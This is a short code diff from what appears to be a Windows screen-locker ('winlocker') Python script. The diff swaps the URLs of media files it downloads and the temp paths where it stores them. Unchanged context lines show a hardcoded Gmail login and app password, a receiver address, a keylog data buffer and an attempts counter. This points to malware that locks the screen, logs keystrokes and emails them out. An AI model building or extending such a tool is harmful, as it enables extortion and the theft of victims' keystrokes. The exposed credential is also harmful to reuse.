@@ -18,10 +18,10 @@ SKULL_BASE64 = "YOUR_BASE64_HERE"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/pp.mp4"
+VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "dedsek_video.mp4")
-AUDIO_PATH = os.path.join(tempfile.gettempdir(), "dedsek_audio.mp3")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_video.mp4")
+AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_audio.mp3")
 
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
